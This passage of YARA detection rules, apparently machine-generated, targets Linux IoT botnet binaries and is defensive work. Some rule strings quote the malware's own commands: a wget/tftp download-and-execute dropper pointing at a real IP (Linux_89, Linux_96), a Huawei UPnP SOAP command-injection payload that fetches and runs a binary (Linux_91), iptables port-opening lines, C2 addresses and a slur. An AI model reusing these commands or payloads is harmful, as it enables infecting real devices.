      $s3 = "LCOGQGPTGP" fullword ascii
      $s4 = "ANMWFDNCPG" fullword ascii
      $s5 = "PGDPGQJ" fullword ascii
      $s6 = "VPCLQDGP" fullword ascii
      $s7 = "CRRNKACVKML" fullword ascii
      $s8 = "AMLLGAVKML" fullword ascii
      $s9 = "NMACVKML" fullword ascii
      $s10 = "AMLVGLV" fullword ascii
      $s11 = "GLAMFKLE" fullword ascii
      $s12 = "LGVQNKLI" fullword ascii
      $s13 = "FGNGVGF" fullword ascii
      $s14 = "ql22,!!!%" fullword ascii
      $s15 = "185.196.8.32" fullword ascii
      $s16 = "LAMPPGAV\"" fullword ascii
      $s17 = "vqMWPAG" fullword ascii
      $s18 = "DMWLF\"" fullword ascii
      $s19 = "sWGP[\"" fullword ascii
      $s20 = "GLVGP\"" fullword ascii

      $op0 = { ff 00 00 ff 00 00 ef 58 fe 50 83 66 7d 46 0c 36 }
      $op1 = { 80 09 00 09 00 09 00 09 00 09 00 09 00 86 2f 43 }
      $op2 = { 86 2f 96 2f a6 2f 63 6a b6 2f 73 6b c6 2f 53 6c }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_78 {
   meta:
      description = "Linux_78"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "749d1984e4efea4fe2f18a4dc6869ccb20faaead7faa386c283a9135c4289e04"
   strings:
      $s1 = "v%F%cd" fullword ascii
      $s2 = "Pccg7x3" fullword ascii
      $s3 = "lEXDWA[" fullword ascii
      $s4 = "uclntudp_create: out of memory" fullword ascii
      $s5 = "SbbbaW2e" fullword ascii
      $s6 = "FhFiFjFkFlFmFnFo&D" fullword ascii
      $s7 = "CREQ\\3" fullword ascii
      $s8 = "GbaSb0" fullword ascii
      $s9 = "-b,j|a" fullword ascii
      $s10 = "R#ay!p1" fullword ascii
      $s11 = "d$Q u@" fullword ascii
      $s12 = "=b4r-a" fullword ascii
      $s13 = "CcKc8#" fullword ascii
      $s14 = "/Cb$aCc" fullword ascii
      $s15 = "/Sm\"O@" fullword ascii
      $s16 = "uKQ)!<A" fullword ascii
      $s17 = "w,bscU2" fullword ascii
      $s18 = "20r.a$" fullword ascii
      $s19 = "FPb3aSh" fullword ascii
      $s20 = " b3`}@<0" fullword ascii

      $op0 = { e0 ff 34 3c 43 00 20 fe 1f 00 a0 c4 40 00 28 d0 }
      $op1 = { 86 2f 96 2f a6 2f 43 6a e6 2f 0d d0 22 4f 0b 40 }
      $op2 = { 86 2f 96 2f 43 69 a6 2f 5c 6a b6 2f 6c 6b c6 2f }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_79 {
   meta:
      description = "Linux_79"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b7775ab003353d3f0a49039ae7ff040de7639babe4e8b965d454ca721b7d2b08"
   strings:
      $s1 = "v%F%cd" fullword ascii
      $s2 = "Pccg7x3" fullword ascii
      $s3 = "lEXDWA[" fullword ascii
      $s4 = "SbbbaW2e" fullword ascii
      $s5 = "FhFiFjFkFlFmFnFo&D" fullword ascii
      $s6 = "CREQ\\3" fullword ascii
      $s7 = "LSpb0a,b" fullword ascii
      $s8 = "pbLS0a,b" fullword ascii
      $s9 = "wLVpaCc%" fullword ascii
      $s10 = "lvrvup9w0zwi6nuqf0kilumln8ox5vgv" fullword ascii
      $s11 = "F@aChPbSg" fullword ascii
      $s12 = "sbmBz\"*!" fullword ascii
      $s13 = "-Asbj!Sf" fullword ascii
      $s14 = "GbaSb0" fullword ascii
      $s15 = "\\1|1,2" fullword ascii
      $s16 = "-b,j|a" fullword ascii
      $s17 = "R#ay!p1" fullword ascii
      $s18 = "d$Q u@" fullword ascii
      $s19 = "=b4r-a" fullword ascii
      $s20 = "/Cb$aCc" fullword ascii

      $op0 = { 80 00 8a 41 00 40 8a 41 00 33 8a 41 00 34 8a 41 }
      $op1 = { 86 2f 48 24 96 2f 43 69 a6 2f 63 6a b6 2f 53 6b }
      $op2 = { 86 2f 96 2f a6 2f 43 6a e6 2f 0d d0 22 4f 0b 40 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_80 {
   meta:
      description = "Linux_80"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b8911cb46515904b88dba20237ec614ef2d0d66393c55d375300df2fe6033c82"
   strings:
      $s1 = "-b,j|a" fullword ascii
      $s2 = "d$Q u@" fullword ascii
      $s3 = "=b4r-a" fullword ascii
      $s4 = "CcKc8#" fullword ascii
      $s5 = "/Sn\"O}" fullword ascii
      $s6 = "B{!+#;!" fullword ascii
      $s7 = "J4}>lB" fullword ascii
      $s8 = "7 a89d" fullword ascii
      $s9 = "AmH|g;\"*" fullword ascii
      $s10 = "}3lA(1" fullword ascii
      $s11 = "}4lA(1" fullword ascii
      $s12 = "F|g;\"Sck!{g" fullword ascii
      $s13 = "\";c+!=@:" fullword ascii
      $s14 = "R`QQRR" fullword ascii
      $s15 = "AmH<c{!<" fullword ascii
      $s16 = "BAdAsV" fullword ascii
      $s17 = "AmH|g;\"h" fullword ascii
      $s18 = "AmH|g;\"$" fullword ascii
      $s19 = "AmH|g;\"P" fullword ascii
      $s20 = "f*!2-z#" fullword ascii

      $op0 = { 4c 64 73 60 15 44 15 8f 6c 66 53 61 04 71 10 61 }
      $op1 = { 80 09 00 09 00 09 00 09 00 09 00 09 00 86 2f 43 }
      $op2 = { 86 2f 96 2f a6 2f 63 6a b6 2f 73 6b c6 2f 53 6c }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_81 {
   meta:
      description = "Linux_81"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e7af5f1d5d68f75ee03a37ee8016695e35edaae528cdba4ab7b9a90570a1e4be"
   strings:
      $s1 = "condi2 %s:%d" fullword ascii
      $s2 = "netstat" fullword ascii
      $s3 = "bot.ppc" fullword ascii
      $s4 = "bot.arm" fullword ascii
      $s5 = "v%F%cd" fullword ascii
      $s6 = "cgvbvc" fullword ascii
      $s7 = "Pccg7x3" fullword ascii
      $s8 = "lEXDWA[" fullword ascii
      $s9 = "uclntudp_create: out of memory" fullword ascii
      $s10 = "SbbbaW2e" fullword ascii
      $s11 = "FhFiFjFkFlFmFnFo&D" fullword ascii
      $s12 = "CREQ\\3" fullword ascii
      $s13 = "bot.arm5" fullword ascii
      $s14 = "bot.mips" fullword ascii
      $s15 = "@KZYA\\EL@" fullword ascii
      $s16 = "bot.arm7" fullword ascii
      $s17 = "bot.arm6" fullword ascii
      $s18 = "bot.mpsl" fullword ascii
      $s19 = "GbaSb0" fullword ascii
      $s20 = "-b,j|a" fullword ascii

      $op0 = { ff 00 00 ff 00 00 40 c6 40 00 34 27 41 00 d4 72 }
      $op1 = { 86 2f 96 2f a6 2f 43 6a e6 2f 0d d0 22 4f 0b 40 }
      $op2 = { 86 2f 96 2f 43 69 a6 2f 5c 6a b6 2f 6c 6b c6 2f }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_82 {
   meta:
      description = "Linux_82"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "2cca5432d55822c704a6da4456f2dafcc42a054002e330645d7849a7a2654ca1"
   strings:
      $s1 = "j\"drc7" fullword ascii
      $s2 = "R#ay!p1" fullword ascii
      $s3 = "Sb}B:!Z\"" fullword ascii
      $s4 = "B#a=A,1" fullword ascii
      $s5 = "CcKc8#" fullword ascii
      $s6 = "B{!+#;!" fullword ascii
      $s7 = "#(u &@" fullword ascii
      $s8 = "J4}>lB" fullword ascii
      $s9 = "7 a89d" fullword ascii
      $s10 = "s^<b\\a" fullword ascii
      $s11 = "AmH|g;\"*" fullword ascii
      $s12 = "}3lA(1" fullword ascii
      $s13 = "A]B{!+#;!" fullword ascii
      $s14 = ".vQllw[" fullword ascii
      $s15 = "/Sn\"O|" fullword ascii
      $s16 = "}4lA(1" fullword ascii
      $s17 = "F|g;\"Sck!{g" fullword ascii
      $s18 = "W=@*Ss" fullword ascii
      $s19 = "R}C+!j" fullword ascii

      $op0 = { 88 99 40 00 09 00 09 00 e6 2f 12 d1 22 4f 18 21 }
      $op1 = { 88 99 40 00 bc 9b 41 00 9c 99 41 }
      $op2 = { 86 2f 96 2f 43 69 a6 2f 5c 6a b6 2f 6c 6b c6 2f }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_83 {
   meta:
      description = "Linux_83"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "72c7ed46536b55cd6bc8bd47b859a0a7a2d150cd4d7184e5810f161c90d86eb3"
   strings:
      $s1 = "(Killer) >> KILLING PID: (%s)" fullword ascii
      $s2 = "j\"drc7" fullword ascii
      $s3 = "R#ay!p1" fullword ascii
      $s4 = "Sb}B:!Z\"" fullword ascii
      $s5 = "B#a=A,1" fullword ascii
      $s6 = "CcKc8#" fullword ascii
      $s7 = "W=@*Ss" fullword ascii
      $s8 = "R}C+!j" fullword ascii
      $s9 = "Z&#c\\3" fullword ascii
      $s10 = "A,b+!p1" fullword ascii
      $s11 = "0e1T\\e" fullword ascii
      $s12 = "r2!`2q" fullword ascii
      $s13 = "r\"/#k#l" fullword ascii
      $s14 = "p/r/t/" fullword ascii
      $s15 = "Q]cln\\" fullword ascii
      $s16 = "3#mlk0c" fullword ascii
      $s17 = "q !7S8#" fullword ascii

      $op0 = { 80 09 00 09 00 09 00 09 00 09 00 09 00 86 2f 43 }
      $op1 = { 86 2f 96 2f 43 69 a6 2f 5c 6a b6 2f 6c 6b c6 2f }
      $op2 = { f8 a3 40 00 09 00 09 00 e6 2f 12 d1 22 4f 18 21 }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_84 {
   meta:
      description = "Linux_84"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b75a0a8b9c4eeb03ba67d942b16ee80c780101c6e0bf8c0a8e19cbc98ae755eb"
   strings:
      $s1 = "bin/systemd" fullword ascii
      $s2 = "bin/busybox" fullword ascii
      $s3 = "bin/watchdog" fullword ascii
      $s4 = "FGDCWNV" fullword ascii
      $s5 = "LCOGQGPTGP" fullword ascii
      $s6 = "RCQQUMPF" fullword ascii
      $s7 = "ANMWFDNCPG" fullword ascii
      $s8 = "PGDPGQJ" fullword ascii
      $s9 = "QWRGPTKQMP" fullword ascii
      $s10 = "QWRRMPV" fullword ascii
      $s11 = "VPCLQDGP" fullword ascii
      $s12 = "QOACFOKL" fullword ascii
      $s13 = "QGPTKAG" fullword ascii
      $s14 = "CFOKLKQVPCVMP" fullword ascii
      $s15 = "PGCNVGI" fullword ascii
      $s16 = "CRRNKACVKML" fullword ascii
      $s17 = "ZOJFKRA" fullword ascii
      $s18 = "AMLLGAVKML" fullword ascii
      $s19 = "HWCLVGAJ" fullword ascii
      $s20 = "NMACVKML" fullword ascii

      $op0 = { 17 93 10 c3 03 61 f4 e2 2c 41 17 61 18 21 0c 8b }
      $op1 = { ff 00 00 ff 00 00 09 00 09 00 09 00 09 00 09 00 }
      $op2 = { 80 09 00 09 00 09 00 09 00 09 00 09 00 86 2f 68 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_85 {
   meta:
      description = "Linux_85"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "44f473fad788f09f28865159d99da9cf52b0f370a79657d2900efdf220a3c2a8"
   strings:
      $s1 = "FICMUHDKPJKCF" fullword ascii
      $s2 = "UCVAJFME" fullword ascii
      $s3 = "FGDCWNV" fullword ascii
      $s4 = "LCOGQGPTGP" fullword ascii
      $s5 = "185.196.10.155" fullword ascii
      $s6 = "LAMPPGAV\"" fullword ascii
      $s7 = "vqMWPAG" fullword ascii
      $s8 = "DMWLF\"" fullword ascii
      $s9 = "NKLWZQJGNN\"" fullword ascii
      $s10 = "sWGP[\"" fullword ascii
      $s11 = "GLVGP\"" fullword ascii
      $s12 = "UCVAJFME\"" fullword ascii
      $s13 = "AOFNKLG\"" fullword ascii
      $s14 = "CQQUMPF\"" fullword ascii
      $s15 = "JCICK\"" fullword ascii
      $s16 = "NMACN\"" fullword ascii
      $s17 = "QVCPV\"" fullword ascii
      $s18 = "}UCVAJFME\"" fullword ascii
      $s19 = "GFHICK\"" fullword ascii
      $s20 = "QVCVWQ\"" fullword ascii

      $op0 = { 4c 64 73 60 15 44 15 8f 6c 66 53 61 04 71 10 61 }
      $op1 = { ff 00 00 ff 00 00 ef 58 fe 50 83 66 7d 46 0c 36 }
      $op2 = { 86 2f 96 2f a6 2f 63 6a b6 2f 73 6b c6 2f 53 6c }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_86 {
   meta:
      description = "Linux_86"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "0d8c04e275d51adb7d645b05595f091409deabde33a09adf36351b0f3a096f58"
   strings:
      $s1 = "/bin/busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s2 = "/usr/bin/iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s3 = "busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s4 = "bindtoip" fullword ascii
      $s5 = "v%F%cd" fullword ascii
      $s6 = "Pccg7x3" fullword ascii
      $s7 = "SbbbaW2e" fullword ascii
      $s8 = "FhFiFjFkFlFmFnFo&D" fullword ascii
      $s9 = "CREQ\\3" fullword ascii
      $s10 = "LSpb0a,b" fullword ascii
      $s11 = "pbLS0a,b" fullword ascii
      $s12 = "wLVpaCc%" fullword ascii
      $s13 = "RebirthLTD" fullword ascii
      $s14 = ")RaRg-Az!" fullword ascii
      $s15 = "xtRrajS" fullword ascii
      $s16 = "xsaMA\"#" fullword ascii
      $s17 = "GbaSb0" fullword ascii
      $s18 = "\\1|1,2" fullword ascii
      $s19 = "AMB[!+'{!" fullword ascii
      $s20 = "CcKc8#" fullword ascii

      $op0 = { ff 00 00 ff 00 00 09 00 09 00 09 00 09 00 34 7f }
      $op1 = { 80 64 6b 42 00 c4 f5 40 00 34 a8 40 00 f4 f1 40 }
      $op2 = { 86 2f 96 2f a6 2f 43 6a e6 2f 0d d0 22 4f 0b 40 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_87 {
   meta:
      description = "Linux_87"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "4364e07cf5802920eed2e1ddf6b325583c943dd7db5b2f4d48e5c5ed5b21cabd"
   strings:
      $s1 = " F>0 F" fullword ascii
      $s2 = "  F2  F" fullword ascii
      $s3 = "&8|$&!" fullword ascii
      $s4 = "wf$!  " fullword ascii
      $s5 = "$[\\B4!(" fullword ascii
      $s6 = "$8|$&!(" fullword ascii
      $s7 = "x|D&!(" fullword ascii

      $op0 = { 01 00 42 a2 34 00 a3 8f 30 00 a4 8f 48 00 a9 8f }
      $op1 = { 08 42 34 0c 00 82 ae 09 f8 20 03 }
      $op2 = { ff ff 10 34 61 00 d0 12 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( all of them and all of ($op*) )
}

rule Linux_88 {
   meta:
      description = "Linux_88"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "759b8adb28dfad81c0ee507e252afe5292ec84242254e432385b5fc6eabcbe5e"
   strings:
      $s1 = " F>0 F" fullword ascii
      $s2 = "  F2  F" fullword ascii
      $s3 = "$8hc$L" fullword ascii
      $s4 = "`ic$xb" fullword ascii
      $s5 = "xF$!`@" fullword ascii

      $op0 = { 08 42 34 0c 00 82 ae 09 f8 20 03 }
      $op1 = { 11 04 04 3c 37 49 84 34 19 00 44 00 18 00 bc 8f }
      $op2 = { 40 00 42 30 34 00 40 10 }
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      ( all of them and all of ($op*) )
}

rule Linux_89 {
   meta:
      description = "Linux_89"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "a0d4326ed4b2611dfcbb53cf43dddd80a71159ddb915db08ca8acc6f220de3b2"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91." ascii
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91." ascii
      $s3 = "tpget -v -u anonymous -p anonymous -P 21 91.92.254.69 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm " ascii
      $s4 = "92.254.69 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 91.92.254.69; chmod 777 tftp2.sh; sh tftp2.sh; f" ascii
      $s5 = "wget --no-check-certificate -q -O /tmp/null " fullword ascii
      $s6 = "REPORT %s:%s:%s" fullword ascii
      $s7 = "__stdio_mutex_initializer.3833" fullword ascii
      $s8 = "infectline" fullword ascii
      $s9 = "getRandomPublicIP" fullword ascii
      $s10 = "GETLOCALIP" fullword ascii
      $s11 = "libc/sysdeps/linux/mips/pipe.S" fullword ascii
      $s12 = "PROBING" fullword ascii
      $s13 = "getBogos" fullword ascii
      $s14 = "getCores" fullword ascii
      $s15 = "/usr/sbin/dropbear" fullword ascii
      $s16 = "zprintf" fullword ascii
      $s17 = "hextable" fullword ascii
      $s18 = "fdpclose" fullword ascii
      $s19 = "fdpopen" fullword ascii
      $s20 = "__GI_pipe" fullword ascii

      $op0 = { 40 00 42 30 34 00 40 10 }
      $op1 = { 08 00 42 34 09 f8 20 03 00 00 42 a6 10 00 bc 8f }
      $op2 = { 23 30 06 00 34 00 bf 8f 30 00 b6 8f 2c 00 b5 8f }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_90 {
   meta:
      description = "Linux_90"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "f47daac916902e5bb7cc568c2f81e0eaa60f8b6780438f4348cd8c5d8bc982ce"
   strings:
      $s1 = " F>0 F" fullword ascii
      $s2 = "  F2  F" fullword ascii
      $s3 = "&8|$&!" fullword ascii
      $s4 = "wf$!  " fullword ascii
      $s5 = "$8|$&!(" fullword ascii
      $s6 = "x|D&!(" fullword ascii

      $op0 = { 01 00 42 a2 34 00 a3 8f 30 00 a4 8f 48 00 a9 8f }
      $op1 = { 08 42 34 0c 00 82 ae 09 f8 20 03 }
      $op2 = { ff ff 10 34 61 00 d0 12 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( all of them and all of ($op*) )
}

rule Linux_91 {
   meta:
      description = "Linux_91"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "3b14ef9f21049cbdaf8f65f5a5cd6ae9406f8c9e92ebd2effa925fdc6cf2cb12"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = " -g 103.188.244.189 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii
      $s3 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox w" ascii
      $s4 = "bin/systemd" fullword ascii
      $s5 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s6 = "killall" fullword ascii
      $s7 = "bin/busybox" fullword ascii
      $s8 = "bin/watchdog" fullword ascii
      $s9 = "MCJBG@K." fullword ascii
      $s10 = "w5q6he3dbrsgmclkiu4to18npavj702f" fullword ascii
      $s11 = " &&  mv " fullword ascii
      $s12 = " F>0 F" fullword ascii
      $s13 = "  F2  F" fullword ascii
      $s14 = "LAZ@KZ" fullword ascii
      $s15 = "@I[WK@@IFG" fullword ascii
      $s16 = "'<@F$4" fullword ascii
      $s17 = "AF$!`@" fullword ascii
      $s18 = "$l5c$4" fullword ascii
      $s19 = "@Rb$(R" fullword ascii
      $s20 = "RP$(Rq$" fullword ascii

      $op0 = { 08 42 34 0c 00 82 ae 09 f8 20 03 }
      $op1 = { 11 04 04 3c 37 49 84 34 19 00 44 00 18 00 bc 8f }
      $op2 = { 40 00 42 30 34 00 40 10 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_92 {
   meta:
      description = "Linux_92"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "49c9af449f7e8e9c5c702904a872c1bdbf39619064ab5e3ba4f55cdff14f69b8"
   strings:
      $s1 = "__stdio_mutex_initializer.3833" fullword ascii
      $s2 = "completed.2296" fullword ascii
      $s3 = "object.2349" fullword ascii
      $s4 = "libc/sysdeps/linux/mips/crtn.S" fullword ascii
      $s5 = "libc/string/mips/memcpy.S" fullword ascii
      $s6 = "libc/sysdeps/linux/mips/crti.S" fullword ascii
      $s7 = "been_there_done_that.2792" fullword ascii
      $s8 = "libc/string/mips/memset.S" fullword ascii
      $s9 = "libc/sysdeps/linux/mips/crt1.S" fullword ascii
      $s10 = "next_start.1065" fullword ascii
      $s11 = "qual_chars.4050" fullword ascii
      $s12 = "spec_ranges.4047" fullword ascii
      $s13 = "spec_flags.4045" fullword ascii
      $s14 = "spec_and_mask.4049" fullword ascii
      $s15 = "spec_chars.4046" fullword ascii
      $s16 = "xdigits.3043" fullword ascii
      $s17 = "spec_base.4044" fullword ascii
      $s18 = "prefix.4045" fullword ascii
      $s19 = "spec_or_mask.4048" fullword ascii
      $s20 = " F>0 F" fullword ascii

      $op0 = { 40 00 42 30 34 00 40 10 }
      $op1 = { 08 00 42 34 09 f8 20 03 00 00 42 a6 10 00 bc 8f }
      $op2 = { 23 30 06 00 34 00 bf 8f 30 00 b6 8f 2c 00 b5 8f }
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_93 {
   meta:
      description = "Linux_93"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e0c17965177ad76a35427374a06d2c4e8521fd54c46012cdd1842211b50d50de"
   strings:
      $s1 = "__stdio_mutex_initializer.3833" fullword ascii
      $s2 = "completed.2296" fullword ascii
      $s3 = "object.2349" fullword ascii
      $s4 = "libc/sysdeps/linux/mips/crtn.S" fullword ascii
      $s5 = "libc/string/mips/memcpy.S" fullword ascii
      $s6 = "libc/sysdeps/linux/mips/crti.S" fullword ascii
      $s7 = "been_there_done_that.2792" fullword ascii
      $s8 = "libc/string/mips/memset.S" fullword ascii
      $s9 = "libc/sysdeps/linux/mips/crt1.S" fullword ascii
      $s10 = "next_start.1065" fullword ascii
      $s11 = "qual_chars.4050" fullword ascii
      $s12 = "spec_ranges.4047" fullword ascii
      $s13 = "ipState.5191" fullword ascii
      $s14 = "spec_flags.4045" fullword ascii
      $s15 = "spec_and_mask.4049" fullword ascii
      $s16 = "spec_chars.4046" fullword ascii
      $s17 = "xdigits.3043" fullword ascii
      $s18 = "spec_base.4044" fullword ascii
      $s19 = "prefix.4045" fullword ascii
      $s20 = "spec_or_mask.4048" fullword ascii

      $op0 = { 40 00 42 30 34 00 40 10 }
      $op1 = { 08 00 42 34 09 f8 20 03 00 00 42 a6 10 00 bc 8f }
      $op2 = { 23 30 06 00 34 00 bf 8f 30 00 b6 8f 2c 00 b5 8f }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_94 {
   meta:
      description = "Linux_94"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "ea66749c138b33d7930e244b5022d6e8516932e4d9dbfbe2626e30313dfd51b2"
   strings:
      $s1 = "lvrvup9w0zwi6nuqf0kilumln8ox5vgv" fullword ascii
      $s2 = " F>0 F" fullword ascii
      $s3 = "  F2  F" fullword ascii
      $s4 = "`kc$xd" fullword ascii
      $s5 = "vF$!`@" fullword ascii
      $s6 = "$XvR$!" fullword ascii
      $s7 = "$8jc$L" fullword ascii

      $op0 = { 08 42 34 0c 00 82 ae 09 f8 20 03 }
      $op1 = { 11 04 04 3c 37 49 84 34 19 00 44 00 18 00 bc 8f }
      $op2 = { 40 00 42 30 34 00 40 10 }
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      ( all of them and all of ($op*) )
}

rule Linux_95 {
   meta:
      description = "Linux_95"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "2aab0918710e87642fc932c2b444ab09f7ed1d7e6ce6ed7e81f0f38cd868504e"
   strings:
      $s1 = "__stdio_mutex_initializer.3812" fullword ascii
      $s2 = "[0;97m ] Connected -> " fullword ascii
      $s3 = "/home/firmware/build/temp-sh4/gcc-core/gcc/config/sh/lib1funcs.asm" fullword ascii
      $s4 = "Nigger Bruted -> %s [ %s:%s ]" fullword ascii
      $s5 = "completed.2217" fullword ascii
      $s6 = "94.156.64.143:9821" fullword ascii
      $s7 = "spec_chars.4025" fullword ascii
      $s8 = "[0;97m| Device: " fullword ascii
      $s9 = "L_uClibc_main" fullword ascii
      $s10 = "Pccg7x3" fullword ascii
      $s11 = "been_there_done_that.2753" fullword ascii
      $s12 = "spec_flags.4024" fullword ascii
      $s13 = "next_start.1030" fullword ascii
      $s14 = "__init_brk" fullword ascii
      $s15 = "xdigits.3026" fullword ascii
      $s16 = "object.2270" fullword ascii
      $s17 = "unknown.1072" fullword ascii
      $s18 = "spec_ranges.4026" fullword ascii
      $s19 = "spec_or_mask.4027" fullword ascii
      $s20 = "__sdivsi3_i4" fullword ascii

      $op0 = { 24 31 41 00 09 00 09 00 e6 2f 12 d1 22 4f 18 21 }
      $op1 = { 24 31 41 00 60 36 42 00 38 31 42 }
      $op2 = { d6 03 00 00 c2 06 00 00 06 08 00 00 46 09 00 00 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_96 {
   meta:
      description = "Linux_96"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "f44e58547489d21e5a39d30fc54eeb3e7fa2483cc1e8e82c0dbcca4ccae69a0b"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91." ascii
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.254.69/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91." ascii
      $s3 = "tpget -v -u anonymous -p anonymous -P 21 91.92.254.69 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm " ascii
      $s4 = "92.254.69 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 91.92.254.69; chmod 777 tftp2.sh; sh tftp2.sh; f" ascii
      $s5 = "wget --no-check-certificate -q -O /tmp/null " fullword ascii
      $s6 = "REPORT %s:%s:%s" fullword ascii
      $s7 = "__stdio_mutex_initializer.3812" fullword ascii
      $s8 = "/home/firmware/build/temp-sh4/gcc-core/gcc/config/sh/lib1funcs.asm" fullword ascii
      $s9 = "infectline" fullword ascii
      $s10 = "getRandomPublicIP" fullword ascii
      $s11 = "GETLOCALIP" fullword ascii
      $s12 = "PROBING" fullword ascii
      $s13 = "getBogos" fullword ascii
      $s14 = "getCores" fullword ascii
      $s15 = "/usr/sbin/dropbear" fullword ascii
      $s16 = "zprintf" fullword ascii
      $s17 = "hextable" fullword ascii
      $s18 = "fdpclose" fullword ascii
      $s19 = "fdpopen" fullword ascii
      $s20 = "completed.2217" fullword ascii

      $op0 = { e6 2f 68 26 62 15 71 15 03 8d f3 6e 51 16 02 a0 }
      $op1 = { 24 ee 40 00 09 00 09 00 e6 2f 12 d1 22 4f 18 21 }
